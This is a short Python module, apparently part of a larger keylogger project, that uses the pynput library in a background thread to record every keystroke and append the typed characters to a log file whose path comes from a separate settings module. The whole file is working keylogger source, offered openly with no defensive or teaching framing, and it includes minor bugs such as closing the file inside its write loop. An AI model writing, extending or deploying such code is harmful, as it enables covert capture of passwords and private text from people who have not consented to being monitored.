#module to keylog
from hashlib import new
from threading import Thread
from vars import *
from pynput.keyboard import Key,Listener

class Keylog(Thread):
    strokes = 0
    count = 0
    keys = []
    def on_press(self,key):
        print(key)
        self.keys.append(key)
        self.count += 1
        self.strokes += 1
        if self.count >=1:
            self.count = 0
            self.write_file()
            self.keys = []
    def write_file(self):
        with open(f'{key_log_path}\\{keys_information}', "a+") as f:
            for key in self.keys:
                k =  str(key).replace('\'' , "")
                if k.find("space")>0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()
    def stop(self):
        self.on_release(Key.esc)
    def on_release(self,key):
        if (key == Key.esc) or (self.strokes==10):
            return False
    def run(self):
        with Listener(on_press= self.on_press, on_release= self.on_release) as listener:
            listener.join()
logger = Keylog()
def run():
    global logger
    logger.start()
def stop():
    global logger
    logger.stop()
#run() #some testing code
